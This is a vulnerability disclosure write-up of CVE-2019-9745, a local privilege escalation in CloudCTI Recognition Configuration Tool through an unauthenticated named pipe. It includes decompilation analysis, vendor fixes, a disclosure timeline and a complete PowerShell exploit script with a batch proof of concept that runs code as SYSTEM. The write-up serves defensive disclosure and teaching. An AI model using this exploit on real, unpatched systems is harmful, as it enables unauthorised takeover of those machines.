<div style="text-align: right">Author: Arn Vollebregt</div>

# Introduction #

Creativity is at the core of [penetration testing](https://en.wikipedia.org/wiki/Penetration_test), which keeps our work interesting. One pitfall however is the tendency to 'over-engineer' attack scenarios and focus solely on bugs (error conditions). Flaws (unintended behaviour) may however be present with equally devastating results. This article provides a case-study to demonstrate the importance of pentesting for such flaws. Simultaneously it makes a case for employing an SDLC ([Secure Development Lifecycle](https://www.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project)) process.

The article is part of the RD ([responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure)) of vulnerability [CVE-2019-9745](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9745) and has been written in close cooperation with vendor [CloudCTI](https://www.cloudcti.nl/). It gives a high-level overview of the vulnerability before deep-diving into the technical details. After demonstrating exploitation of the vulnerability a conclusion is provided with lessons learned.

# Summary #

The *CloudCTI Recognition Configuration Tool* we examined during one of our penetration tests is used to retrieve information from CRM (Customer Relationship Management) software. This provides callcenter personnel with relevant information during customer calls. Several issues where identified that can be chained together to fully compromise the local system. The vendor would like to stress this does not affect systems of other customers nor their own.

As with many [security](https://en.wikipedia.org/wiki/Information_security) vulnerabilities an important issue lies in validating data originating from outside your sphere of influence. Equally important is the realization that systems and software operate in hostile environments. Time and experience has taught us eavesdropping is a threat on the internet. The same however is true for other communication channels, even within a system itself. This was instrumental in discovering the vulnerability.

A root-cause analysis of the encountered issues shows the importance of practices such as TM ([threat modelling](https://en.wikipedia.org/wiki/Threat_model)). TM helps identifying risks during the early stages of design and development. This can lead to mitigation of unacceptable risks or redesign/reimplementation. Although the reader is encouraged to perform their own analysis, descriptions of the vendor's countermeasures are provided for reference.

# The vulnerability #

The vendor software consists of four applications that work together. The first application is the Graphical user interface (GUI). This allows the user to initiate information retrieval from several CRM software packages:

![](CloudCTI_Recognition_Configuration_Tool-Add_Application.png)
**<div style="text-align: right">Figure 01</div>**

The GUI delegates information retrieval to a service (the second application) by sending a message. The first security issues manifest themself here: not only can anybody on the system observe the messages between the GUI and the service to determine their format and content (affecting [confidentiality](https://en.wikipedia.org/wiki/Information_security#Confidentiality)), they can also send their own messages (affecting [authorization](https://en.wikipedia.org/wiki/Information_security#Authorization)). Furthermore, the source of messages to the service is not verified (affecting [non-repudiation](https://en.wikipedia.org/wiki/Information_security#Non-repudiation)). In [STRIDE](https://en.wikipedia.org/wiki/STRIDE_(security)) threat modelling terminology this means the system is prone to [information disclosure](https://en.wikipedia.org/wiki/Data_breach) and [tampering](https://en.wikipedia.org/wiki/Tampering_(crime)). Indeed, information gleaned from these messages was instrumental in discovering the vulnerability.

The third application is one of many specialized importers. The service offloads information retrieval for a specific CRM package to a specific importer. The message send by the GUI contains specific instructions for this importer. Looking at the *Exquise* CRM importer it turns out information retrieval is further delegated to an external (fourth) application. Examining the internal logic of the importer it was discovered the external application could be specified in the message between the GUI and service. The issue that manifests itself here is that the external application is executed without verifying it's identity (affecting [non-repudiation](https://en.wikipedia.org/wiki/Information_security#Non-repudiation)). 

Chaining these issues together we could eavesdrop on messages to determine their format and send a message in which we specify our own malicious external application. That external application is executed with the same privileges as the importer/service. As these privileges are the highest possible within the system total control is achieved and the system is compromised.

These issues are mitigated by the vendor by [encrypting](https://en.wikipedia.org/wiki/Encryption) the messages (mitigating the [confidentiality](https://en.wikipedia.org/wiki/Information_security#Confidentiality) issue) through the use of unique [shared secrets](https://en.wikipedia.org/wiki/Shared_secret) (mitigating the [authorization](https://en.wikipedia.org/wiki/Information_security#Authorization) issue) that can only be accessed by the [authenticated](https://en.wikipedia.org/wiki/Authentication) system users that own them (mitigating the first [non-repudiation](https://en.wikipedia.org/wiki/Information_security#Non-repudiation) issue). Finally, the external application is cryptograpically [signed](https://en.wikipedia.org/wiki/Code_signing) (mitigating the second [non-repudiation](https://en.wikipedia.org/wiki/Information_security#Non-repudiation) issue). Combining these measures successfully mitigates the vulnerability.

# Technical details #

When the *CloudCTI Recognition Configuration Tool* GUI application (*C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\CloudCTI Recognition Configuration Tool.exe*) is installed it is examined with [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). This uncovers that a companion service (*Recognition Update Client Service*) is installed and executed with *NT AUTHORITY\SYSTEM* rights:

![](RecognitionUpdateClientServiceService.exe_as_SYSTEM.png)
**<div style="text-align: right">Figure 02</div>**

Upon investigating the service executable (*C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\RUCS\RecognitionUpdateClientServiceService.exe*) it becomes apparent it is developed using the [.NET](https://dotnet.microsoft.com/) programming language. This can be decompiled using [dnSpy](https://github.com/0xd4d/dnSpy) to gain the insight in it's internal logic, which will be detailed below.

*RUCS2017Service* (the internal *.NET* namespace in the service executable) turns out to be a thin wrapper around the *RUCS2017* namespace (*C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\RUCS\RUCS2017.dll*). This defines a [Named Pipe](https://docs.microsoft.com/en-us/windows/desktop/ipc/named-pipes) server named *RUCS20151029* at *RUCS2017.dll:RUCS2017.TRUCS2017:902*:

![](RUCS2017.TRUCS2017.mFerbNamedPipeServer.png)
**<div style="text-align: right">Figure 03</div>**

That named pipe server is started at *RUCS2017.dll:RUCS2017.TRUCS2017:833*:

![](RUCS2017.TRUCS2017.Start.png)
**<div style="text-align: right">Figure 04</div>**

The following [Powershell](https://en.wikipedia.org/wiki/PowerShell) one-liner is used to confirm this pipe is indeed active on the system:
```
PS C:\Users\hacker> [System.IO.Directory]::GetFiles("\\.\\pipe\\") |Select-String -Pattern "RUCS20151029"

\\.\\pipe\\RUCS20151029
```

Using [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) the access rights of the pipe are examined. Through this it is discovered the pipe can be read (*R*) from and written (*W*) to by any system user (*Everyone*):

```
PS C:\Users\hacker> .\accesschk.exe \pipe\RUCS20151029

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\RUCS20151029
  RW Everyone
  RW BUILTIN\Administrators
```

When the *Add application* functionality in the GUI is used (see *Figure 01*) the following unencrypted traffic is observed on the named pipe using [IO Ninja](https://ioninja.com/):

![](IO_Ninja-RUCS20151029.png)
**<div style="text-align: right">Figure 05</div>**

This contains the following [JSON](https://en.wikipedia.org/wiki/JSON) data:

```JSON
{
    "Command":"WizardGetData",
    "Params":
    {
        "ReturnSize":50,
        "DatasourceType":"exquise exporter",
        "DatasourceSettings":
        {
            "ExquiseFolder":"C:\\Users\\hacker\\Desktop"}
        }
    ,"Id":"76037453"
}
```

Processing of messages on the pipe is [event](https://docs.microsoft.com/en-us/dotnet/standard/events/) based and subscribed to in the constructor of the service at *RUCS2017.dll:RUCS2017.TRUCS2017:803*:

![](RUCS2017.TRUCS2017.constructor.png)
**<div style="text-align: right">Figure 06</div>**

In this function the JSON is first deserialized at *RUCS2017.dll:RUCS2017.TRUCS2017:267*:

![](RUCS2017.TRUCS2017.FerbNamedPipeServerMessageReceivedEvent.png)
**<div style="text-align: right">Figure 07</div>**

The specific logic for processing the *WizardGetData* JSON message structure can be found at *RUCS2017.dll:RUCS2017.TRUCS2017:315* under the *TFerbCommandType.WizardGetData* enumeration case:

![](RUCS2017.TRUCS2017.FerbNamedPipeServerMessageReceivedEvent.WizardGetData.png)
**<div style="text-align: right">Figure 08</div>**

A task manager then starts a new thread at *RUCS2017.dll:RUCS2017.TRUCS2017.TTaskManager:614* passing the parsed message structure:

![](RUCS2017.TRUCS2017.TTaskManager.AddTaskGetData.png)
**<div style="text-align: right">Figure 09</div>**

The *DatasourceType* (for a specific CRM package) is dynamically loaded at *RUCS2017.dll:RUCS2017.TRUCS2017.TTaskManager:177*:

![](RUCS2017.TRUCS2017.TTaskManager.ThreadAddTaskGetData.png)
**<div style="text-align: right">Figure 10</div>**

Which loads the *.dll* file defined in *json.conf:17*:

![](config.json_DatasourceExquiseExporter.dll.png)
**<div style="text-align: right">Figure 11</div>**

Further processing of the message is then delegated to the *C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\RUCS\Datasources\Legacy\DatasourceExquiseExporter.dll* plugin at *RUCS2017.dll:RUCS2017.TRUCS2017.TTaskManager:197* (*Figure 10*).

*CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource* is derived from *CloudCTI.Datasources.TextFile.RUS2015.TextFileDatasource* (*C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\RUCS\Datasources\Legacy\DatasourceTextFile.dll*). This in turn is derived from *CloudCTI.Datasources.RUS2015.DatasourceBase* (*C:\Program Files (x86)\CloudCTI Recognition Configuration Tool\RUCS\Datasources\Legacy\CloudCTIReplicationDatasourcesClass.dll*). We find the implementation of the *GetData* method at *CloudCTI.Datasources.RUS2015.DatasourceBase:133* which calls *initializeDatasource* at *CloudCTI.Datasources.RUS2015.DatasourceBase:142*:

![](CloudCTI.Datasources.RUS2015.DatasourceBase.GetData.png)
**<div style="text-align: right">Figure 12</div>**

This in turn calls *DatasourceInitialize* at *CloudCTI.Datasources.RUS2015.DatasourceBase:598*:

![](CloudCTI.Datasources.RUS2015.DatasourceBase.initializeDatasource.png)
**<div style="text-align: right">Figure 13</div>**

First the JSON message is parsed at *CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource:24*:

![](CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource.DatasourceInitialize.png)
**<div style="text-align: right">Figure 14</div>**


The structure of this message is defined in the *CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterSettings* class. This class also contains the *ExporterApplication* property which is of great interest to us:

![](CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterSettings.png)
**<div style="text-align: right">Figure 15</div>**

At *CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource:29* (see *figure 14*) it is checked if the *ExporterApplication* is set in the message. If this is no the case a default application is used otherwise the external application from the message is used. <span style='color:red'>**This is where the vulnerability manifests itself**</span>. At *CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource:41* (see *Figure 14*) the *createExportFile* method is called which starts the previously determined external application (line *73*):

![](CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterDatasource.createExportFile.png)
**<div style="text-align: right">Figure 16</div>**

# The exploit #

As the service process (*C:\Program Files (x86)\HIP Integrator\RUCS\RecognitionUpdateClientServiceService.exe*) runs with *NT AUTHORITY\SYSTEM* rights it has access to **all** facets of the system, which we now also have via the *CloudCTI.Datasources.ExquiseExporter.RUS2015.ExquiseExporterSettings.ExporterApplication* property. When this is crafted into the message the following JSON template is the result:

```JSON
{
    "Command":"WizardGetData",
    "Params":
    {
        "ReturnSize":RETURN_SIZE,
        "DatasourceType":"exquise exporter",
        "DatasourceSettings":
        {
            "ExquiseFolder":"FOLDER_NAME",
            "ExporterApplication":"APPLICATION_NAME"
        }
    },
    "Id":"RANDOM_VALUE"
}
```

Through trial&error it turns out the *ExporterApplication* can be a [batch](https://en.wikipedia.org/wiki/Batch_file) script which requires no downloading of additional resources and can be placed in a (user) directory that is under control of a user with low(er) privileges. As all users can write to the *RUCS20151029* Named Pipe the following [PowerShell](https://docs.microsoft.com/en-us/powershell/) script is used to send crafted JSON to the named pipe:

**CVE-2019-9745.ps1**:
```powershell
# Import .NET classes in Powershell.
add-Type -assembly "System.Core"
# Create required 'data' directory (per internal programming logic).
New-Item -ItemType directory -Path data -Force > $null
# Remove any cached results, which may block execution of the exploit.
Remove-Item -Path C:\Windows\Temp\exquiseexport.csv -Force -ErrorAction Ignore
$pipeName = '\RUCS20151029'
# Construct/configure a named pipe client.
$pipe = new-object System.IO.Pipes.NamedPipeClientStream(
    ".",
    $pipeName,
    [System.IO.Pipes.PipeDirection]::InOut,
    [System.IO.Pipes.PipeOptions]::Asynchronous,
    [System.Security.Principal.TokenImpersonationLevel]::Anonymous
);
$pipe.Connect(1000);
$pipe.ReadMode = [System.IO.Pipes.PipeTransmissionMode]::Message;
$pipeWriter = new-object System.IO.StreamWriter($pipe);
# Craft JSON payload that points to our external/own application (CVE-2019-9745.bat).
$payload = '{"Command":"WizardGetData","Params":{"ReturnSize":50,"DatasourceType":"exquise exporter","DatasourceSettings":{"ExquiseFolder":"C:\\Users\\hacker\\exploit","ExporterApplication":"C:\\Users\\hacker\\exploit\\CVE-2019-9745.bat"}},"Id":"' + $(Get-Random) + '"}'
# Properly encode the payload.
$payload = [System.Text.Encoding]::Unicode.GetBytes($payload)
# Send the payload.
$pipeWriter.Write($payload, 0, $payload.length);
$pipeWriter.flush()
```

The following batch script is specified in the JSON message as the external application (*ExporterApplication*). As a proof of concept the name of the user that executes it is written to a file. Of course this can be replaced with any command (sequence).

**CVE-2019-9745.bat**:
```batch
@ECHO OFF
whoami > C:\Users\hacker\exploit\CVE-2019-9745.log
```

When the message is sent by a normal (low privileged) user (using *CVE-2019-9745.ps1*) we can indeed see that *CVE-2019-9745.bat* is executed using elevated privileges (*NT Authority\SYSTEM*):

![](exploit-CVE-2019-9745_successfull.png)
**<div style="text-align: right">Figure 17</div>**

# Conclusion #

From a pentesting perspective testing for flaws in the (business) logic of a system can be a significant time investment. Because most pentests are [black-box testing](https://en.wikipedia.org/wiki/Black-box_testing) (as opposed to [white-box testing](https://en.wikipedia.org/wiki/White-box_testing)) this usually involves [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering). However, as demonstrated flaws can be just as devastating as bugs. For this reason a two-pronged approach testing both for bugs and flaws is strongly advised.

From the standpoint of a vendor it is important to not only ask the question '*how can our products be used*' but also '*how can it be abused*'. SDLC ([Secure Development Lifecycle](https://www.owasp.org/index.php/OWASP_Secure_Software_Development_Lifecycle_Project)) can help with [risk management](https://en.wikipedia.org/wiki/Risk_management) during the various stages of a product lifecycle: security [requirements](https://en.wikipedia.org/wiki/Software_security_assurance#Software_security_assurance_activities), [architecture](https://en.wikipedia.org/wiki/Enterprise_information_security_architecture) and a [threat model](https://en.wikipedia.org/wiki/Threat_model) aid the high and low level design phase. [Static](https://en.wikipedia.org/wiki/Static_program_analysis)/[dynamic](https://en.wikipedia.org/wiki/Dynamic_program_analysis) code analysis and [peer reviewing](https://en.wikipedia.org/wiki/Peer_review) aid the development process. Finally, [penetration testing](https://en.wikipedia.org/wiki/Penetration_test) provides an (independent) audit. Of course, results of these processes are to be offset against a [risk appetite](https://en.wikipedia.org/wiki/Risk_appetite). From a financial perspective various studies (*[The Business Case for Security in the SDLC](http://cdn2.hubspot.net/hub/355303/file-559719186-pdf/whitepapers/business-case-appsec.pdf)*) have concluded that addressing (security) defects in earlier stages of a product lifecycle is more cost-effective than remediation. This means investing in SDLC can reduce the TCO (Total Cost of Ownership) in the long run.

Bridging both perspectives it is important to keep investing in [Security awareness](https://en.wikipedia.org/wiki/Security_awareness) on all fronts through training and education. This ensures all parties are up-to-date on both opportunities and security risks in the IT domain that keep evolving at a rapid pace. As such, we can all contribute to a more secure society.

# Responsible Disclosure Time-line #

* 25-01-2019 : Vulnerability reported to vendor CloudCTI by KPN CERT.
* 14-02-2019 : Hotfix released to customers by CloudCTI.
* 13-03-2019 : CVE reservation by MITRE.
* 18-04-2019 : Initial patch provided to KPN by CloudCTI.
* 26-04-2019 : Retest of vulnerability by KPN Red team.
* 02-05-2019 : Revised patch provided to KPN by CloudCTI.
* 02-05-2019 : Retest of vulnerability by KPN Red team.
* 19-06-2019 : Patch released to customers by CloudCTI.
* 27-06-2019 : Security notification released by CloudCTI.
* 14-10-2019 : Publication of this writeup by KPN Red team on [GitHub](https://github.com/KPN-CISO/CVE-2019-9745/blob/master/README.md).
* 14-10-2019 : CVE publication by MITRE.
* 07-11-2019 : Publication of this writeup by KPN Red Team on [kpn.com](https://www.kpn.com/security-blogs/flaws-vs-bugs-cve-2019-9745.htm).

# Severity #

The [CVSS](https://www.first.org/cvss/) score we assigned to this vulnerability is 8.8 ([CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)).